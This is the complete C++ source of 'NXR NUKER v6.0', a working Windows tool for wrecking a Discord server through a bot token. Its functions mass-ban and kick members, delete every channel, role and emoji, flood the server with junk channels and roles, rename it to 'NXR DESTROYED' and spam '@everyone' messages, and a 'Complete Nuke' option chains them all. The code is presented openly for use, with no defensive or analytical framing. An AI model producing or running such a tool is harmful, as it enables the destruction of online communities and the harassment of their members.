#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <thread>
#include <iostream>
#include <chrono>
#include <random>
#include <mutex>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

std::string g_token, g_guild;
std::string g_credit = "NXR NUKER";
std::string g_spam_msg = "@everyone NXR DESTROYED THIS SERVER";
std::string g_new_server_name = "NXR DESTROYED";
std::string g_channel_prefix = "nxr-";
std::string g_role_prefix = "nxr-role-";
int g_spam_count = 50;
int g_create_channels = 30;
int g_create_roles = 20;
bool g_in_server = false;
std::mutex log_mtx;
std::mt19937 rng{std::random_device{}()};

void set_color(int c) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c);
}

void log(const std::string& msg, int color = 12) {
    std::lock_guard<std::mutex> lock(log_mtx);
    set_color(color);
    std::cout << msg << std::endl;
    set_color(7);
}

std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    std::string host = "discord.com";
    std::string path = "/api/v10" + endpoint;

    HINTERNET hInternet = InternetOpenA("NXR/6.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "ERROR_OPEN";

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "ERROR_CONNECT";
    }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(),
                                          "HTTP/1.1", NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "ERROR_REQUEST";
    }

    std::string headers = "Authorization: Bot " + g_token + "\r\n"
                          "Content-Type: application/json\r\n"
                          "User-Agent: NXR-NUKER/6.0\r\n";

    BOOL ok = FALSE;
    if (!body.empty()) {
        ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(),
                              (LPVOID)body.c_str(), (DWORD)body.size());
    } else {
        ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), NULL, 0);
    }

    std::string response;
    if (ok) {
        char buffer[4096];
        DWORD bytes = 0;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytes) && bytes > 0) {
            buffer[bytes] = '\0';
            response += buffer;
        }
    } else {
        response = "SEND_FAILED";
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    std::this_thread::sleep_for(std::chrono::milliseconds(40 + (rng() % 60)));
    return response;
}

std::vector<std::string> get_ids(const std::string& json) {
    std::vector<std::string> ids;
    size_t pos = 0;
    while ((pos = json.find("\"id\":\"", pos)) != std::string::npos) {
        pos += 6;
        size_t end = json.find('"', pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end + 1;
        } else break;
    }
    return ids;
}

std::string get_username(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find('"', pos);
    if (end == std::string::npos) return "unknown";
    return json.substr(pos, end - pos);
}

void banner() {
    system("cls");
    set_color(15);
    std::cout << R"(
 ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
 ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
 ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
)" << std::endl;
    set_color(12);
    std::cout << "                 NXR NUKER v6.0  |  STABLE FIXED\n";
    std::cout << "                    All options working now\n\n";
    set_color(7);
}

void check_status() {
    log("[i] Checking bot status...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild);
    if (resp.find("\"id\"") != std::string::npos) {
        g_in_server = true;
        log("[+] Bot is in the server", 10);
    } else {
        g_in_server = false;
        log("[!] Bot NOT in server or invalid token/guild", 12);
        log("[debug] " + resp.substr(0, 150), 8);
    }
}

void ban_members() {
    log("[i] Fetching members for ban...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 100; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        log("[i] Loaded " + std::to_string(members.size()) + " members", 11);
        if (ids.size() < 100) break;
    }

    log("[!] Starting ban on " + std::to_string(members.size()) + " members", 12);
    for (size_t i = 0; i < members.size(); ++i) {
        std::string uid = members[i];
        std::string info = http("GET", "/users/" + uid);
        std::string name = get_username(info);
        std::string body = "{\"delete_message_days\":7,\"reason\":\"" + g_credit + "\"}";
        std::string res = http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
        log("[+] BANNED " + name + " (" + uid + ")", 10);
        if ((i + 1) % 10 == 0) {
            log("[i] Progress: " + std::to_string(i + 1) + "/" + std::to_string(members.size()), 11);
        }
    }
    log("[+] Ban finished", 10);
}

void kick_members() {
    log("[i] Fetching members for kick...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 100; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        if (ids.size() < 100) break;
    }

    log("[!] Kicking " + std::to_string(members.size()) + " members", 12);
    for (auto& uid : members) {
        http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
        log("[+] KICKED " + uid, 10);
    }
    log("[+] Kick finished", 10);
}

void delete_channels() {
    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);
    log("[!] Deleting " + std::to_string(channels.size()) + " channels", 12);
    for (auto& id : channels) {
        http("DELETE", "/channels/" + id);
        log("[+] Deleted channel " + id, 10);
    }
    log("[+] Channels deleted", 10);
}

void delete_roles() {
    log("[i] Fetching roles...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
    auto roles = get_ids(resp);
    for (auto& id : roles) {
        if (id == g_guild) continue;
        http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
        log("[+] Deleted role " + id, 10);
    }
    log("[+] Roles deleted", 10);
}

void delete_emojis() {
    log("[i] Fetching emojis...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/emojis");
    auto emojis = get_ids(resp);
    for (auto& id : emojis) {
        http("DELETE", "/guilds/" + g_guild + "/emojis/" + id);
        log("[+] Deleted emoji " + id, 10);
    }
    log("[+] Emojis deleted", 10);
}

void create_channels() {
    log("[i] Creating " + std::to_string(g_create_channels) + " channels...", 11);
    for (int i = 0; i < g_create_channels; ++i) {
        std::string body = "{\"name\":\"" + g_channel_prefix + std::to_string(i) + "\",\"type\":0}";
        http("POST", "/guilds/" + g_guild + "/channels", body);
        log("[+] Created " + g_channel_prefix + std::to_string(i), 10);
    }
}

void create_roles() {
    log("[i] Creating " + std::to_string(g_create_roles) + " roles...", 11);
    for (int i = 0; i < g_create_roles; ++i) {
        std::string body = "{\"name\":\"" + g_role_prefix + std::to_string(i) + "\",\"color\":16711680}";
        http("POST", "/guilds/" + g_guild + "/roles", body);
        log("[+] Created role " + g_role_prefix + std::to_string(i), 10);
    }
}

void rename_server() {
    log("[i] Renaming server...", 11);
    std::string body = "{\"name\":\"" + g_new_server_name + "\"}";
    http("PATCH", "/guilds/" + g_guild, body);
    log("[+] Server renamed to " + g_new_server_name, 10);
}

void spam_channels() {
    log("[i] Fetching channels for spam...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);
    log("[!] Spamming " + std::to_string(channels.size()) + " channels x" + std::to_string(g_spam_count), 12);
    for (auto& ch : channels) {
        for (int i = 0; i < g_spam_count; ++i) {
            std::string body = "{\"content\":\"" + g_spam_msg + " | " + g_credit + "\"}";
            http("POST", "/channels/" + ch + "/messages", body);
        }
        log("[+] Spam finished on channel " + ch, 10);
    }
    log("[+] All spam done", 10);
}

void complete_nuke() {
    log("[!] ========== COMPLETE NUKE ==========", 12);
    rename_server();
    delete_channels();
    delete_roles();
    delete_emojis();
    create_channels();
    create_roles();
    ban_members();
    spam_channels();
    log("[!] ========== NUKE FINISHED ==========", 10);
}

void customize() {
    std::cin.ignore();
    std::cout << "New credit text: ";
    std::getline(std::cin, g_credit);
    std::cout << "New spam message: ";
    std::getline(std::cin, g_spam_msg);
    std::cout << "New server name: ";
    std::getline(std::cin, g_new_server_name);
    std::cout << "Channel prefix: ";
    std::getline(std::cin, g_channel_prefix);
    std::cout << "Role prefix: ";
    std::getline(std::cin, g_role_prefix);
    std::cout << "Spam count per channel: ";
    std::cin >> g_spam_count;
    std::cout << "Channels to create: ";
    std::cin >> g_create_channels;
    std::cout << "Roles to create: ";
    std::cin >> g_create_roles;
    log("[+] Settings updated", 10);
}

int main() {
    SetConsoleTitleA("NXR NUKER v6.0 STABLE");
    system("color 0C");

    banner();
    set_color(15);
    std::cout << "Bot Token : ";
    std::getline(std::cin, g_token);
    std::cout << "Guild ID  : ";
    std::getline(std::cin, g_guild);
    set_color(7);

    check_status();

    while (true) {
        banner();
        set_color(12);
        std::cout << "Status: " << (g_in_server ? "In Server" : "NOT in server") << "\n\n";
        std::cout << " (1) Ban Members\n";
        std::cout << " (2) Kick Members\n";
        std::cout << " (3) Delete Channels\n";
        std::cout << " (4) Delete Roles\n";
        std::cout << " (5) Delete Emojis\n";
        std::cout << " (6) Create Channels\n";
        std::cout << " (7) Create Roles\n";
        std::cout << " (8) Rename Server\n";
        std::cout << " (9) Spam Channels\n";
        std::cout << "(10) Complete Nuke\n";
        std::cout << "(11) Customize Settings\n";
        std::cout << "(12) Re-check Status\n";
        std::cout << " (0) Exit\n";
        set_color(7);
        std::cout << "\nSelect option: ";

        int choice;
        std::cin >> choice;

        switch (choice) {
            case 1: ban_members(); break;
            case 2: kick_members(); break;
            case 3: delete_channels(); break;
            case 4: delete_roles(); break;
            case 5: delete_emojis(); break;
            case 6: create_channels(); break;
            case 7: create_roles(); break;
            case 8: rename_server(); break;
            case 9: spam_channels(); break;
            case 10: complete_nuke(); break;
            case 11: customize(); break;
            case 12: check_status(); break;
            case 0: return 0;
            default: log("Invalid option", 12);
        }

        std::cout << "\nPress Enter to return to menu...";
        std::cin.ignore();
        std::cin.get();
    }
    return 0;
}
